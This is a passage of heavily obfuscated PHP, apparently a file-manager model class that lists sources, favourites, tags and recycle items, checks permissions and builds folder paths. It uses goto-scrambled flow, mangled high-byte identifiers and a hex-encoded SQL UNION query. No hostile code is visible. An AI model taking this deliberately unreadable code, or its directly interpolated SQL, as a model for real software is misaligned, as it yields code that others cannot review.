array_filter(array_unique($béˆÜÜÊ)); if (!$béˆÜÜÊ) { return array(); } goto F›çõÍ¨—²; a®ëôÒ”Ü: if (!$dÈÂ‡‹†‰Ò) { $this->_listAppendMeta($A¶±©À á¯, $béˆÜÜÊ); $this->_listAppendChildren($A¶±©À á¯, $béˆÜÜÊ); } $this->_listAppendUser($A¶±©À á¯); $this->_listAppendPath($A¶±©À á¯); goto D£Âçè÷Ï¥; F›çõÍ¨—²: $A¶±©À á¯ = $this->where(array($E´§¸»²²[2] => array($E´§¸»²²[3], $béˆÜÜÊ)))->select(); $this->_listAppendAuth($A¶±©À á¯); $this->_listAppendSourceInfo($A¶±©À á¯, $béˆÜÜÊ); goto a®ëôÒ”Ü; d§‡¹Ò­Æ¤: } public function pathInfoFilter($Fˆ‘çÈ¿İ) { goto AŸÆÆ”°Ø¾; aˆÕ‹„Ş™‘: if ($Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[16]] && $Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[16]][$B‡…£ù“éÑ[17]] == -1) { $aŸƒä””Ş = array_remove_value($aŸƒä””Ş, $B‡…£ù“éÑ[18]); $aŸƒä””Ş = array_remove_value($aŸƒä””Ş, $B‡…£ù“éÑ[19]); $aŸƒä””Ş = array_remove_value($aŸƒä””Ş, $B‡…£ù“éÑ[20]); $aŸƒä””Ş = array_remove_value($aŸƒä””Ş, $B‡…£ù“éÑ[21]); $aŸƒä””Ş = array_remove_value($aŸƒä””Ş, $B‡…£ù“éÑ[22]); $aŸƒä””Ş = array_remove_value($aŸƒä””Ş, $B‡…£ù“éÑ[23]); } $Fˆ‘çÈ¿İ = array_field_key($Fˆ‘çÈ¿İ, $aŸƒä””Ş); return $Fˆ‘çÈ¿İ; goto Fä„Ê‰Éèß; AŸÆÆ”°Ø¾: $B‡…£ù“éÑ =& $_SERVER[óÚ‚£ñ¶]; $Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[4]] = KodIO::make($Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[2]]); $Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[5]] = $Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[6]] == 1 ? $B‡…£ù“éÑ[7] : $B‡…£ù“éÑ[8]; goto dº¡¥Ãœç; A©¸‚ÔèŸĞ: $E…Ç¶¸²İ .= $B‡…£ù“éÑ[13]; $E…Ç¶¸²İ .= $B‡…£ù“éÑ[14]; $aŸƒä””Ş = explode($B‡…£ù“éÑ[15], $E…Ç¶¸²İ); goto aˆÕ‹„Ş™‘; dº¡¥Ãœç: $Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[9]] = $this->typeName($Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[9]]); if ($Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[6]] != 1) { $Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[10]] = $Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[11]]; unset($Fˆ‘çÈ¿İ[$B‡…£ù“éÑ[11]]); } $E…Ç¶¸²İ = $B‡…£ù“éÑ[12]; goto A©¸‚ÔèŸĞ; Fä„Ê‰Éèß: } public function listUserFav() { goto FËÎ¨Ò’¢; EÓ‘æ•¥: $d¹ÄÖäé„Ú = array_to_keyvalue($d¹ÄÖäé„Ú, $dªÚäÁ–—Ü[1], $dªÚäÁ–—Ü[4]); if ($d¹ÄÖäé„Ú) { $f¸ÍñÜ¾Œ© = $this->listSource(array($dªÚäÁ–—Ü[26] => array($dªÚäÁ–—Ü[27], $d¹ÄÖäé„Ú))); } $f¸ÍñÜ¾Œ© = array_to_keyvalue($f¸ÍñÜ¾Œ©[$dªÚäÁ–—Ü[28]], $dªÚäÁ–—Ü[2]); goto D‡’·¯ÊÔ±; FËÎ¨Ò’¢: $dªÚäÁ–—Ü =& $_SERVER[óÚ‚£ñ¶]; $d‚Ö†ÑëÏ = Model($dªÚäÁ–—Ü[24])->listData(); $d¹ÄÖäé„Ú = array_filter_by_field($d‚Ö†ÑëÏ, $dªÚäÁ–—Ü[5], $dªÚäÁ–—Ü[25]); goto EÓ‘æ•¥; D‡’·¯ÊÔ±: foreach ($d‚Ö†ÑëÏ as &$CœäÅµ¥) { $CœäÅµ¥ = array($dªÚäÁ–—Ü[29] => $CœäÅµ¥[$dªÚäÁ–—Ü[30]], $dªÚäÁ–—Ü[31] => $CœäÅµ¥[$dªÚäÁ–—Ü[32]], $dªÚäÁ–—Ü[33] => $CœäÅµ¥[$dªÚäÁ–—Ü[4]], $dªÚäÁ–—Ü[34] => $CœäÅµ¥[$dªÚäÁ–—Ü[5]], $dªÚäÁ–—Ü[35] => $CœäÅµ¥[$dªÚäÁ–—Ü[18]], $dªÚäÁ–—Ü[36] => $CœäÅµ¥[$dªÚäÁ–—Ü[19]]); if ($CœäÅµ¥[$dªÚäÁ–—Ü[5]] == $dªÚäÁ–—Ü[25] && $f¸ÍñÜ¾Œ©[$CœäÅµ¥[$dªÚäÁ–—Ü[4]]]) { $CœäÅµ¥[$dªÚäÁ–—Ü[37]] = $f¸ÍñÜ¾Œ©[$CœäÅµ¥[$dªÚäÁ–—Ü[4]]]; } } return $d‚Ö†ÑëÏ; goto F¥Üí ëîÒ; F¥Üí ëîÒ: } public function listUserTag($f”×ÓÑ“À) { goto bšä®Œå”©; bšä®Œå”©: $DÄã„Ş¸Òø =& $_SERVER[óÚ‚£ñ¶]; $b±ÆÔ­ŠõŒ = Model($DÄã„Ş¸Òø[38])->listData(); $Bš¿Û¼©ª™ = array_filter_by_field($b±ÆÔ­ŠõŒ, $DÄã„Ş¸Òø[39], $f”×ÓÑ“À); goto eãò¸áËŒŸ; eãò¸áËŒŸ: $Bš¿Û¼©ª™ = array_to_keyvalue($Bš¿Û¼©ª™, $DÄã„Ş¸Òø[1], $DÄã„Ş¸Òø[4]); if (!$Bš¿Û¼©ª™) { return array(); } $f¶Œ›£¿¦… = array($DÄã„Ş¸Òø[26] => array($DÄã„Ş¸Òø[27], $Bš¿Û¼©ª™)); goto d‹ï‘­¿ë¡; d‹ï‘­¿ë¡: return $this->listSource($f¶Œ›£¿¦…); goto D­»‚ƒºŒ¹; D­»‚ƒºŒ¹: } public function listUserRecycle() { $cÇôçª¹Ìã =& $_SERVER[óÚ‚£ñ¶]; $eé…×˜’¼™ = Model($cÇôçª¹Ìã[40])->listData(); if (!$eé…×˜’¼™) { return array(); } $f•™„˜š•Ï = array($cÇôçª¹Ìã[26] => array($cÇôçª¹Ìã[27], $eé…×˜’¼™), $cÇôçª¹Ìã[41] => 1); return $this->listSource($f•™„˜š•Ï); } public function listSource($eƒŒ‹êĞëâ, $F‰í¶öë¹‹ = 3000) { goto eöÊÈˆî¿Ú; eöÊÈˆî¿Ú: $CÇÌßíÁìî =& $_SERVER[óÚ‚£ñ¶]; if (!isset($eƒŒ‹êĞëâ[$CÇÌßíÁìî[42]])) { $eƒŒ‹êĞëâ[$CÇÌßíÁìî[42]] = 0; } $BÚ»¿½» = $CÇÌßíÁìî[43]; goto eÏ½Äß°¬£; Eòè¬İÃ¸ğ: return $E»ÏÉ·ºâ‡; goto a¢ˆÅ¦ƒ¤Í; eÏ½Äß°¬£: $E»ÏÉ·ºâ‡ = $this->field($BÚ»¿½»)->_makeOrder()->where($eƒŒ‹êĞëâ)->selectPage($F‰í¶öë¹‹); $this->_listDataApply($E»ÏÉ·ºâ‡[$CÇÌßíÁìî[28]]); $this->_listFilterInfo($E»ÏÉ·ºâ‡); goto Eòè¬İÃ¸ğ; a¢ˆÅ¦ƒ¤Í: } protected function _makeOrder() { goto dİÉ­ÎäÍÏ; EæÏÏè×ï: if ($b¢éˆ˜‚Ÿ == $EÁöƒÓÛáÛ[32]) { } $b»ª¨á‰ ƒ = $EÁöƒÓÛáÛ[54] . $D³ŠÑª‰ è[$b¢éˆ˜‚Ÿ] . $EÁöƒÓÛáÛ[55] . $Böİ³´ÍîÕ[$BæõÀ¬â]; return $this->order(rtrim(trim($b»ª¨á‰ ƒ), $EÁöƒÓÛáÛ[15])); goto dİ‘¯ˆäĞ; e§ÜÍ¼Áó¨: $Böİ³´ÍîÕ = array($EÁöƒÓÛáÛ[47] => $EÁöƒÓÛáÛ[48], $EÁöƒÓÛáÛ[49] => $EÁöƒÓÛáÛ[50]); $D³ŠÑª‰ è = array($EÁöƒÓÛáÛ[32] => $EÁöƒÓÛáÛ[32], $EÁöƒÓÛáÛ[22] => $EÁöƒÓÛáÛ[22], $EÁöƒÓÛáÛ[10] => $EÁöƒÓÛáÛ[11], $EÁöƒÓÛáÛ[20] => $EÁöƒÓÛáÛ[20], $EÁöƒÓÛáÛ[51] => $EÁöƒÓÛáÛ[21], $EÁöƒÓÛáÛ[18] => $EÁöƒÓÛáÛ[18], $EÁöƒÓÛáÛ[19] => $EÁöƒÓÛáÛ[19]); $b¢éˆ˜‚Ÿ = Input::get($EÁöƒÓÛáÛ[52], $EÁöƒÓÛáÛ[3], $E¸ÎÅ•¶, array_keys($D³ŠÑª‰ è)); goto AÎ™ÓÃÉéä; AÎ™ÓÃÉéä: $BæõÀ¬â = Input::get($EÁöƒÓÛáÛ[53], $EÁöƒÓÛáÛ[3], $aÀÎ£øÄ‘…, array_keys($Böİ³´ÍîÕ)); if (!in_array($b¢éˆ˜‚Ÿ, array_keys($D³ŠÑª‰ è))) { $b¢éˆ˜‚Ÿ = $EÁöƒÓÛáÛ[32]; } if (!in_array($BæõÀ¬â, array_keys($Böİ³´ÍîÕ))) { $b¢éˆ˜‚Ÿ = $EÁöƒÓÛáÛ[47]; } goto EæÏÏè×ï; dİÉ­ÎäÍÏ: $EÁöƒÓÛáÛ =& $_SERVER[óÚ‚£ñ¶]; $E¸ÎÅ•¶ = Model($EÁöƒÓÛáÛ[44])->get($EÁöƒÓÛáÛ[45]); $aÀÎ£øÄ‘… = Model($EÁöƒÓÛáÛ[44])->get($EÁöƒÓÛáÛ[46]); goto e§ÜÍ¼Áó¨; dİ‘¯ˆäĞ: } protected function _listDataApplyItem($fŸƒšÙ˜¶, $dĞÛºõñÇ = false) { goto b…ÎºÙñÕ; eİÚç°æÅš: if (!$dĞÛºõñÇ) { $this->_listAppendMeta($Fäˆã¢¦œ•, $c—ØóÜ¸Ò); $this->_listAppendChildren($Fäˆã¢¦œ•, $c—ØóÜ¸Ò); $this->_listAppendPath($Fäˆã¢¦œ•); } $this->_listAppendSourceInfo($Fäˆã¢¦œ•, $c—ØóÜ¸Ò); $this->_listAppendUser($Fäˆã¢¦œ•); goto d•Êê‘‹¥’; b…ÎºÙñÕ: $Fäˆã¢¦œ• = array($fŸƒšÙ˜¶); $c—ØóÜ¸Ò = array($fŸƒšÙ˜¶[$_SERVER[óÚ‚£ñ¶][2]]); $this->_listAppendAuth($Fäˆã¢¦œ•); goto eİÚç°æÅš; d•Êê‘‹¥’: $F·ßÄ‘çÔ‰ = $this->pathInfoFilter($Fäˆã¢¦œ•[0]); return $F·ßÄ‘çÔ‰; goto e‡…àò®“„; e‡…àò®“„: } protected function _listDataApply(&$E™ à›»ïÊ) { goto eÏê«ƒ¹ñ¿; Aœò–¦Š²: $this->_listAppendSourceInfo($E™ à›»ïÊ, $Dºé±©±Œœ); $this->_listAppendChildren($E™ à›»ïÊ, $Dºé±©±Œœ); $this->_listAppendUser($E™ à›»ïÊ); goto Fè…‚òù; eÏê«ƒ¹ñ¿: $Aœ¹¨Úğ° =& $_SERVER[óÚ‚£ñ¶]; if (!$E™ à›»ïÊ) { $E™ à›»ïÊ = array(); return; } $Dºé±©±Œœ = array_to_keyvalue($E™ à›»ïÊ, $Aœ¹¨Úğ°[1], $Aœ¹¨Úğ°[2]); goto F…óíÁ†¦; F…óíÁ†¦: $Dºé±©±Œœ = array_unique($Dºé±©±Œœ); $this->_listAppendAuth($E™ à›»ïÊ); $this->_listAppendMeta($E™ à›»ïÊ, $Dºé±©±Œœ); goto Aœò–¦Š²; Fè…‚òù: $this->_listAppendPath($E™ à›»ïÊ); goto cç¶ŒÇÊÛ; cç¶ŒÇÊÛ: } protected function _listFilterInfo(&$Aë·ÊÂ­íÒ) { $e¯§»öãÊ =& $_SERVER[óÚ‚£ñ¶]; $Aë·ÊÂ­íÒ[$e¯§»öãÊ[56]] = array(); $Aë·ÊÂ­íÒ[$e¯§»öãÊ[57]] = array(); foreach ($Aë·ÊÂ­íÒ[$e¯§»öãÊ[28]] as $eÆè¾á¡‹„) { $DÈŠ¼ÎíŞ = $eÆè¾á¡‹„[$e¯§»öãÊ[6]] == 1 ? $e¯§»öãÊ[56] : $e¯§»öãÊ[57]; $Aë·ÊÂ­íÒ[$DÈŠ¼ÎíŞ][] = $this->pathInfoFilter($eÆè¾á¡‹„); } unset($Aë·ÊÂ­íÒ[$e¯§»öãÊ[28]]); } protected function _listAppendMeta(&$A¸‹®ùÊÂ , $Bà‚¡Ç¼ÜŸ) { goto d¢”ÕÂ™³Ç; d¢”ÕÂ™³Ç: $B¶ÌĞÁéÆ =& $_SERVER[óÚ‚£ñ¶]; $dÕâŞÊß®› = array($B¶ÌĞÁéÆ[26] => array($B¶ÌĞÁéÆ[27], $Bà‚¡Ç¼ÜŸ)); $BÛœ¬· = Model($B¶ÌĞÁéÆ[58])->field($B¶ÌĞÁéÆ[59])->where($dÕâŞÊß®›)->select(); goto CŞğ¸‡¥è³; D‡åŞÌÑ‹¥: foreach ($A¸‹®ùÊÂ  as &$Cñ›Ïô–Ó½) { $Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[62]] = !1; if (isset($AÔ ‘Àğø„[$Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[2]]])) { $Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[62]] = $AÔ ‘Àğø„[$Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[2]]]; } if ($this->fileIsLock($Cñ›Ïô–Ó½) && $Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[16]]) { $c¾¬ª¹’Õ½ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[16]][$B¶ÌĞÁéÆ[17]] = AuthModel::authDisable($Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[16]][$B¶ÌĞÁéÆ[17]], $c¾¬ª¹’Õ½); $Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[16]][$B¶ÌĞÁéÆ[63]][$B¶ÌĞÁéÆ[16]] = $Cñ›Ïô–Ó½[$B¶ÌĞÁéÆ[16]][$B¶ÌĞÁéÆ[17]]; } } goto BÜªŠÚŠ¼É; CŞğ¸‡¥è³: if (!$BÛœ¬·) { return; } $AÔ ‘Àğø„ = array(); foreach ($BÛœ¬· as $E‚¦ôà†š) { if (!isset($AÔ ‘Àğø„[$E‚¦ôà†š[$B¶ÌĞÁéÆ[2]]])) { $AÔ ‘Àğø„[$E‚¦ôà†š[$B¶ÌĞÁéÆ[2]]] = array(); } $AÔ ‘Àğø„[$E‚¦ôà†š[$B¶ÌĞÁéÆ[2]]][$E‚¦ôà†š[$B¶ÌĞÁéÆ[60]]] = $E‚¦ôà†š[$B¶ÌĞÁéÆ[61]]; } goto D‡åŞÌÑ‹¥; BÜªŠÚŠ¼É: } protected function _listAppendSourceInfo(&$Dá¾Û…ÍçÀ, $Aàò¶åƒ®ª) { goto dŞ‹ÉÚå“É; EßÌ§ß’: $E·Ú‰ñˆ­ó = Model($aÇÙóĞ¯òŒ[24])->listData(); $c©¬·¬²‚ = Model($aÇÙóĞ¯òŒ[65])->listSimple(); $cØğƒ§Ë¡Í = array_to_keyvalue($Fªì…²àÜ£, $aÇÙóĞ¯òŒ[30]); goto bãÒ¡¿—¾; dŞ‹ÉÚå“É: $aÇÙóĞ¯òŒ =& $_SERVER[óÚ‚£ñ¶]; $Fªì…²àÜ£ = Model($aÇÙóĞ¯òŒ[64])->listData(); $dá°¬¬«æÅ = Model($aÇÙóĞ¯òŒ[38])->listData(); goto EßÌ§ß’; bãÒ¡¿—¾: $b¨‚åÖ½ñ = array_to_keyvalue_group($dá°¬¬«æÅ, $aÇÙóĞ¯òŒ[4], $aÇÙóĞ¯òŒ[39]); $c¤àÆĞ©¬ = array_to_keyvalue($E·Ú‰ñˆ­ó, $aÇÙóĞ¯òŒ[4]); $bê¦âÌ³Æì = array_to_keyvalue_group($c©¬·¬²‚, $aÇÙóĞ¯òŒ[2]); goto d¡»¢Èöíù; d¡»¢Èöíù: foreach ($Dá¾Û…ÍçÀ as &$D­×¸á æ¾) { $D­×¸á æ¾[$aÇÙóĞ¯òŒ[37]] = array($aÇÙóĞ¯òŒ[66] => 0, $aÇÙóĞ¯òŒ[67] => 0, $aÇÙóĞ¯òŒ[68] => 0); if (isset($c¤àÆĞ©¬[$D­×¸á æ¾[$aÇÙóĞ¯òŒ[2]]])) { $D­×¸á æ¾[$aÇÙóĞ¯òŒ[37]][$aÇÙóĞ¯òŒ[69]] = 1; $D­×¸á æ¾[$aÇÙóĞ¯òŒ[37]][$aÇÙóĞ¯òŒ[70]] = $c¤àÆĞ©¬[$D­×¸á æ¾[$aÇÙóĞ¯òŒ[2]]][$aÇÙóĞ¯òŒ[32]]; } if (isset($b¨‚åÖ½ñ[$D­×¸á æ¾[$aÇÙóĞ¯òŒ[2]]])) { $D­×¸á æ¾[$aÇÙóĞ¯òŒ[37]][$aÇÙóĞ¯òŒ[71]] = array(); foreach ($b¨‚åÖ½ñ[$D­×¸á æ¾[$aÇÙóĞ¯òŒ[2]]] as $bÂˆ’—¡­) { $FöœŞ‰ê¥ = $cØğƒ§Ë¡Í[$bÂˆ’—¡­]; $D­×¸á æ¾[$aÇÙóĞ¯òŒ[37]][$aÇÙóĞ¯òŒ[71]][] = array($aÇÙóĞ¯òŒ[72] => $FöœŞ‰ê¥[$aÇÙóĞ¯òŒ[30]], $aÇÙóĞ¯òŒ[31] => $FöœŞ‰ê¥[$aÇÙóĞ¯òŒ[32]], $aÇÙóĞ¯òŒ[73] => $FöœŞ‰ê¥[$aÇÙóĞ¯òŒ[74]]); } } if (isset($bê¦âÌ³Æì[$D­×¸á æ¾[$aÇÙóĞ¯òŒ[2]]])) { $D­×¸á æ¾[$aÇÙóĞ¯òŒ[37]][$aÇÙóĞ¯òŒ[75]] = array(); foreach ($bê¦âÌ³Æì[$D­×¸á æ¾[$aÇÙóĞ¯òŒ[2]]] as $DçîíÊ§¡) { $D­×¸á æ¾[$aÇÙóĞ¯òŒ[37]][$aÇÙóĞ¯òŒ[75]] = array($aÇÙóĞ¯òŒ[76] => $DçîíÊ§¡[$aÇÙóĞ¯òŒ[77]], $aÇÙóĞ¯òŒ[78] => $DçîíÊ§¡[$aÇÙóĞ¯òŒ[79]], $aÇÙóĞ¯òŒ[80] => $DçîíÊ§¡[$aÇÙóĞ¯òŒ[2]], $aÇÙóĞ¯òŒ[81] => $DçîíÊ§¡[$aÇÙóĞ¯òŒ[82]], $aÇÙóĞ¯òŒ[83] => $DçîíÊ§¡[$aÇÙóĞ¯òŒ[84]]); } } } return $Dá¾Û…ÍçÀ; goto Fóë„´œ°; Fóë„´œ°: } protected function _listAppendChildren(&$bµø¨¼—‘˜, $FÕÄ÷³õˆ) { goto e´Ò¹·ÖŸ; eè¡’å‚Úö: for ($E¬Ô—èÔ…ï = 0; $E¬Ô—èÔ…ï < $fÔ«ŸŸØÒÁ; $E¬Ô—èÔ…ï++) { if ($bµø¨¼—‘˜[$E¬Ô—èÔ…ï][$fñ£ÎÑà…Ş[6]]) { $eß¶ßĞãÇÊ = $bµø¨¼—‘˜[$E¬Ô—èÔ…ï][$fñ£ÎÑà…Ş[2]]; $dò†¾ ˆï .= "\123\105\x4c\105\103\124\x20\52\x20\x46\122\117\x4d\40\50\123\x45\x4c\105\x43\x54\40\x27{$eß¶ßĞãÇÊ}\137\x68\x61\163\x46\151\x6c\145\47\x20\x61\163\40\150\141\163\40\106\122\117\x4d\x20\140{$d‰Š÷ôƒéÏ}\x60\x20\12\11\11\11\x9\11\167\x68\x65\x72\145\40\160\x61\162\145\x6e\164\111\104\x3d{$eß¶ßĞãÇÊ}\x20\141\x6e\144\x20\151\x73\x46\157\x6c\x64\x65\162\75\x30\40\141\x6e\144\40\x69\163\x44\x65\x6c\x65\164\145\x3d\60\40\x6c\151\155\x69\x74\40\61\51\40\x61\x73\x20\x74\142\x31\x5f{$eß¶ßĞãÇÊ}\40\x75\x6e\x69\157\156\x20\x61\154\x6c\x20\12\x9\11\x9\x9\11\x53\105\x4c\x45\x43\x54\x20\x2a\40\x46\x52\117\115\x20\x28\x53\x45\x4c\x45\103\x54\40\47{$eß¶ßĞãÇÊ}\137\x68\x61\x73\x46\157\154\x64\x65\162\47\40\141\163\40\150\x61\x73\106\151\x6c\145\x20\106\x52\x4f\x4d\40\x60{$d‰Š÷ôƒéÏ}\140\x20\xa\x9\x9\x9\11\11\x77\150\145\162\145\40\x70\141\x72\145\x6e\x74\111\104\75{$eß¶ßĞãÇÊ}\x20\x61\x6e\x64\40\x69\x73\x46\157\154\x64\145\162\x3d\61\x20\x61\156\144\x20\x69\163\104\x65\x6c\x65\x74\145\x3d\60\x20\154\151\155\x69\x74\40\61\51\x20\x61\x73\40\164\142\62\137{$eß¶ßĞãÇÊ}\x20\x75\156\151\x6f\x6e\40\x61\154\154\x20"; } if ((strlen($dò†¾ ˆï) >= $B²âğñóãÓ || $E¬Ô—èÔ…ï == $fÔ«ŸŸØÒÁ - 1) && $dò†¾ ˆï) { $dò†¾ ˆï = substr($dò†¾ ˆï, 0, -strlen($fñ£ÎÑà…Ş[86])); $e²±ùÕ¢¬ = $this->query($dò†¾ ˆï); $F¤ÜÅÏ’–‚ = array_merge($F¤ÜÅÏ’–‚, $e²±ùÕ¢¬); $dò†¾ ˆï = $fñ£ÎÑà…Ş[1]; } } $F¤ÜÅÏ’–‚ = array_to_keyvalue($F¤ÜÅÏ’–‚, $fñ£ÎÑà…Ş[87], $fñ£ÎÑà…Ş[87]); foreach ($bµø¨¼—‘˜ as &$Bçä¿Ò¬—ø) { if ($Bçä¿Ò¬—ø[$fñ£ÎÑà…Ş[6]]) { unset($Bçä¿Ò¬—ø[$fñ£ÎÑà…Ş[11]]); $Bçä¿Ò¬—ø[$fñ£ÎÑà…Ş[88]] = isset($F¤ÜÅÏ’–‚[$Bçä¿Ò¬—ø[$fñ£ÎÑà…Ş[2]] . $fñ£ÎÑà…Ş[89]]); $Bçä¿Ò¬—ø[$fñ£ÎÑà…Ş[90]] = isset($F¤ÜÅÏ’–‚[$Bçä¿Ò¬—ø[$fñ£ÎÑà…Ş[2]] . $fñ£ÎÑà…Ş[91]]); } } goto bŸÇÔ¡Ú¯; b‹«Ì‡É¡¯: $B²âğñóãÓ = 1024 * 50; $fÔ«ŸŸØÒÁ = count($bµø¨¼—‘˜); $d‰Š÷ôƒéÏ = $this->tablePrefix . $this->tableName; goto eè¡’å‚Úö; e´Ò¹·ÖŸ: $fñ£ÎÑà…Ş =& $_SERVER[óÚ‚£ñ¶]; $dò†¾ ˆï = $fñ£ÎÑà…Ş[85]; $F¤ÜÅÏ’–‚ = array(); goto b‹«Ì‡É¡¯; bŸÇÔ¡Ú¯: } protected function _listAppendAuth(&$DÉ¶õ²ï¿¹) { goto A‹‰öÑê·º; C‹êÉßá÷Ê: foreach ($DÉ¶õ²ï¿¹ as $eØÊñ‰’ä“ => &$c÷³šğªìƒ) { $c÷³šğªìƒ[$C†—â†Ï¬Ü[16]] = $C¢’÷£¯Ğã[$c÷³šğªìƒ[$C†—â†Ï¬Ü[2]]]; if (!$c÷³šğªìƒ[$C†—â†Ï¬Ü[16]] && $c÷³šğªìƒ[$C†—â†Ï¬Ü[9]] == self::TYPE_GROUP) { $c÷³šğªìƒ[$C†—â†Ï¬Ü[16]] = Action($C†—â†Ï¬Ü[93])->pathGroupAuthMake($c÷³šğªìƒ[$C†—â†Ï¬Ü[94]]); if (!$c÷³šğªìƒ[$C†—â†Ï¬Ü[16]] && !$GLOBALS[$C†—â†Ï¬Ü[95]]) { $c÷³šğªìƒ[$C†—â†Ï¬Ü[96]] = !1; $c÷³šğªìƒ[$C†—â†Ï¬Ü[97]] = !1; } } if ($c÷³šğªìƒ[$C†—â†Ï¬Ü[16]]) { $c÷³šğªìƒ[$C†—â†Ï¬Ü[96]] = AuthModel::authCheckEdit($c÷³šğªìƒ[$C†—â†Ï¬Ü[16]][$C†—â†Ï¬Ü[17]]); $c÷³šğªìƒ[$C†—â†Ï¬Ü[97]] = AuthModel::authCheckView($c÷³šğªìƒ[$C†—â†Ï¬Ü[16]][$C†—â†Ï¬Ü[17]]); } $this->groupPathDisplay($c÷³šğªìƒ); } goto A¤îÎÍÒö…; a–Ÿë›òÉ: if (!$c˜ïÓî‰£ç) { return; } $Aàâ¨°ˆ•Å = array_to_keyvalue($DÉ¶õ²ï¿¹, $C†—â†Ï¬Ü[2]); $C¢’÷£¯Ğã = Model($C†—â†Ï¬Ü[92])->getSourceList($c˜ïÓî‰£ç, $Aàâ¨°ˆ•Å); goto C‹êÉßá÷Ê; A‹‰öÑê·º: $C†—â†Ï¬Ü =& $_SERVER[óÚ‚£ñ¶]; $c˜ïÓî‰£ç = array(); foreach ($DÉ¶õ²ï¿¹ as $c÷³šğªìƒ) { if ($c÷³šğªìƒ[$C†—â†Ï¬Ü[9]] == self::TYPE_GROUP) { $c˜ïÓî‰£ç[] = $c÷³šğªìƒ[$C†—â†Ï¬Ü[2]]; } } goto a–Ÿë›òÉ; A¤îÎÍÒö…: } public function groupPathDisplay(&$Fñ…‰¡ƒª¥) { goto EÜ÷Àİ ‚Š; cİÑìÀ¿: $Fñ…‰¡ƒª¥[$bÌ§©ìŠ–Ü[100]] = $EÏ³‹ÈŠùŒ[$bÌ§©ìŠ–Ü[101]]; $Fñ…‰¡ƒª¥[$bÌ§©ìŠ–Ü[23]] = $EÏ³‹ÈŠùŒ[$bÌ§©ìŠ–Ü[99]]; $Fñ…‰¡ƒª¥[$bÌ§©ìŠ–Ü[102]] = $EÏ³‹ÈŠùŒ[$bÌ§©ìŠ–Ü[103]]; goto F†Ï´†Ğğî; EÜ÷Àİ ‚Š: $bÌ§©ìŠ–Ü =& $_SERVER[óÚ‚£ñ¶]; if ($Fñ…‰¡ƒª¥[$bÌ§©ìŠ–Ü[9]] != self::TYPE_GROUP) { return; } $EÏ³‹ÈŠùŒ = Model($bÌ§©ìŠ–Ü[98])->getInfo($Fñ…‰¡ƒª¥[$bÌ§©ìŠ–Ü[94]]); goto c¯±³ø• ; c¯±³ø• : $C¦ õ™ºòÂ = $this->parentLevelArray($EÏ³‹ÈŠùŒ[$bÌ§©ìŠ–Ü[99]]); $d‰Ÿø÷ËÃ = $bÌ§©ìŠ–Ü[1]; foreach ($C¦ õ™ºòÂ as $a†Ø†°Ùèì) { $a´Íéôéö¤ = Model($bÌ§©ìŠ–Ü[98])->getInfo($a†Ø†°Ùèì); $d‰Ÿø÷ËÃ .= $a´Íéôéö¤[$bÌ§©ìŠ–Ü[37]][$bÌ§©ìŠ–Ü[2]] . $bÌ§©ìŠ–Ü[15]; } goto cİÑìÀ¿; F†Ï´†Ğğî: $Fñ…‰¡ƒª¥[$bÌ§©ìŠ–Ü[104]] = $d‰Ÿø÷ËÃ . $EÏ³‹ÈŠùŒ[$bÌ§©ìŠ–Ü[37]][$bÌ§©ìŠ–Ü[2]]; goto Fš—Äó—Ç; Fš—Äó—Ç: } protected function _listAppendPath(&$dé±ï®å…‰) { goto DéÎ„ÆÚ°™; B…Š•Şì¥: foreach ($dé±ï®å…‰ as &$b“’¿Õ•Ç) { goto E”‚–¡³Ç; bÃ¿ÎÏñ: $C³µ±’Ş†Ï = trim($b“’¿Õ•Ç[$FÈùØÊœÀ[107]], $FÈùØÊœÀ[106]); if ($b“’¿Õ•Ç[$FÈùØÊœÀ[101]] == $FÈùØÊœÀ[109] && $C³µ±’Ş†Ï) { $b“’¿Õ•Ç[$FÈùØÊœÀ[32]] = $C³µ±’Ş†Ï; } goto D–áíÇÍ¥”; eÌßïÜ÷œá: if ($dÛŞÉäåí›) { $Fê¾‹®Å§ .= $b“’¿Õ•Ç[$FÈùØÊœÀ[32]]; } if ($b“’¿Õ•Ç[$FÈùØÊœÀ[6]]) { $Fê¾‹®Å§ .= $FÈùØÊœÀ[106]; } $b“’¿Õ•Ç[$FÈùØÊœÀ[107]] = str_replace($FÈùØÊœÀ[108], $FÈùØÊœÀ[106], $Fê¾‹®Å§); goto bÃ¿ÎÏñ; E”‚–¡³Ç: $dÛŞÉäåí› = $this->parentLevelArray($b“’¿Õ•Ç[$FÈùØÊœÀ[99]]); $Fê¾‹®Å§ = $this->_listAppendPathRoot($b“’¿Õ•Ç, $dÛŞÉäåí›); foreach ($dÛŞÉäåí› as $f‚ß…ëœÇÙ) { if (isset($A½óÈ‘‡Ü[$f‚ß…ëœÇÙ])) { $Fê¾‹®Å§ .= $A½óÈ‘‡Ü[$f‚ß…ëœÇÙ] . $FÈùØÊœÀ[106]; } } goto eÌßïÜ÷œá; D–áíÇÍ¥”: } goto CÉØ¸É»Ú; DéÎ„ÆÚ°™: $FÈùØÊœÀ =& $_SERVER[óÚ‚£ñ¶]; $A½óÈ‘‡Ü = array(); foreach ($dé±ï®å…‰ as &$b“’¿Õ•Ç) { $A½óÈ‘‡Ü[$b“’¿Õ•Ç[$FÈùØÊœÀ[2]]] = $b“’¿Õ•Ç[$FÈùØÊœÀ[32]]; $dÛŞÉäåí› = $this->parentLevelArray($b“’¿Õ•Ç[$FÈùØÊœÀ[99]]); array_shift($dÛŞÉäåí›); foreach ($dÛŞÉäåí› as $f‚ß…ëœÇÙ) { if 